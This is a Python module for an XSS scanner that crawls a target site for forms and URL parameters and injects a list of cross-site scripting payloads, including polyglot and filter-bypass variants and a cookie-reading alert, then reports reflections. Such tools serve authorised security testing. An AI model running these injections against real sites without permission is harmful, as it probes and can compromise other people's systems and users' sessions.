"""XSS Scanner - Reflected, Stored, DOM-based, Polyglot attacks."""
import asyncio, re, random
from typing import Optional
from urllib.parse import urljoin, quote
import aiohttp
from bs4 import BeautifulSoup
from ..utils.helpers import status, random_ua, severity_tag, cvss_score

XSS_PAYLOADS = {
    "basic": [
        "<script>alert('XSS')</script>",
        "<script>alert(document.cookie)</script>",
        "\"><script>alert(1)</script>",
        "'><script>alert(1)</script>",
    ],
    "img": [
        "<img src=x onerror=alert(1)>",
        "\"><img src=x onerror=alert(1)>",
        "'><img src=x onerror=alert(1)>",
        "<img src=1 onerror=prompt(1)>",
    ],
    "svg": [
        "<svg/onload=alert(1)>",
        "<svg><animateTransform onbegin=alert(1)>",
        "<svg onload=alert(1)>",
    ],
    "polyglot": [
        "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
        "\" onfocus=alert(1) autofocus=\"",
        "javascript:alert(1)",
        "data:text/html,<script>alert(1)</script>",
    ],
    "waf_bypass": [
        "<sCrIpT>alert(1)</sCrIpT>",
        "<scr<script>ipt>alert(1)</scr</script>ipt>",
        "%3Cscript%3Ealert(1)%3C/script%3E",
        "\\x3Cscript\\x3Ealert(1)\\x3C/script\\x3E",
    ],
}

class XSSScanner:
    """Comprehensive XSS Scanner."""

    def __init__(self, target: str):
        self.target = target.rstrip("/")
        self.findings = []
        self.forms = []
        self.reflected_params = set()

    async def crawl(self) -> list:
        """Crawl for XSS injection points."""
        status("Crawling for XSS points...", "info")
        headers = {"User-Agent": random_ua()}
        visited = set()
        to_visit = [self.target]
        forms = []

        async with aiohttp.ClientSession() as s:
            while to_visit and len(visited) < 30:
                url = to_visit.pop(0)
                if url in visited: continue
                try:
                    resp = await s.get(url, headers=headers, timeout=10, ssl=False)
                    if "text/html" not in resp.headers.get("Content-Type",""): continue
                    html = await resp.text()
                    visited.add(url)
                    soup = BeautifulSoup(html, 'html.parser')

                    for form in soup.find_all("form"):
                        action = form.get("action","")
                        method = form.get("method","get").lower()
                        inputs = []
                        for inp in form.find_all(["input","textarea"]):
                            name = inp.get("name")
                            if name:
                                inputs.append({"name":name,"type":inp.get("type","text")})
                        if inputs:
                            forms.append({"url":urljoin(url,action) if action else url,"method":method,"inputs":inputs})

                    # Find links with parameters
                    for link in soup.find_all("a", href=True):
                        href = urljoin(url, link["href"])
                        if "?" in href and href.startswith(self.target):
                            for param in href.split("?")[1].split("&"):
                                if "=" in param:
                                    self.reflected_params.add(param.split("=")[0])

                except: continue

        self.forms = forms
        status(f"Found {len(forms)} forms, {len(self.reflected_params)} params", "success")
        return forms

    async def test_reflected(self) -> list:
        """Test for reflected XSS in URL parameters."""
        findings = []
        headers = {"User-Agent": random_ua()}
        async with aiohttp.ClientSession() as s:
            for category, payloads in XSS_PAYLOADS.items():
                for payload in payloads[:2]:
                    # Test main URL
                    test_url = f"{self.target}/?xss_test={quote(payload)}"
                    try:
                        resp = await s.get(test_url, headers=headers, timeout=8, ssl=False)
                        html = await resp.text()
                        if payload in html:
                            findings.append({
                                "type": "XSS (Reflected)",
                                "category": category,
                                "url": self.target,
                                "payload": payload,
                                "severity": "HIGH",
                            })
                            status(f"XSS Reflected found! [{category}]", "high")
                    except: continue

        return findings

    async def test_forms(self) -> list:
        """Test forms for XSS."""
        findings = []
        headers = {"User-Agent": random_ua(), "Content-Type": "application/x-www-form-urlencoded"}
        async with aiohttp.ClientSession() as s:
            for form in self.forms[:10]:
                for category, payloads in XSS_PAYLOADS.items():
                    for payload in payloads[:2]:
                        try:
                            if form["method"] == "get":
                                parts = []
                                for inp in form["inputs"]:
                                    parts.append(f"{inp['name']}={quote(payload)}")
                                test_url = form["url"] + ("&" if "?" in form["url"] else "?") + "&".join(parts)
                                resp = await s.get(test_url, headers=headers, timeout=8, ssl=False)
                            else:
                                data = {}
                                for inp in form["inputs"]:
                                    data[inp["name"]] = payload
                                resp = await s.post(form["url"], headers=headers, data=data, timeout=8, ssl=False)

                            html = await resp.text()
                            if payload in html:
                                findings.append({
                                    "type": "XSS (Reflected Form)",
                                    "category": category,
                                    "url": form["url"],
                                    "method": form["method"].upper(),
                                    "payload": payload,
                                    "severity": "HIGH",
                                })
                                status(f"XSS in form! [{category}]", "high")
                                break  # One finding per form
                        except: continue

        return findings

    async def full_scan(self) -> list:
        """Run full XSS scan."""
        await self.crawl()
        all_findings = []
        all_findings.extend(await self.test_reflected())
        all_findings.extend(await self.test_forms())
        status(f"XSS scan: {len(all_findings)} finding(s)", "success" if not all_findings else "high")
        return all_findings
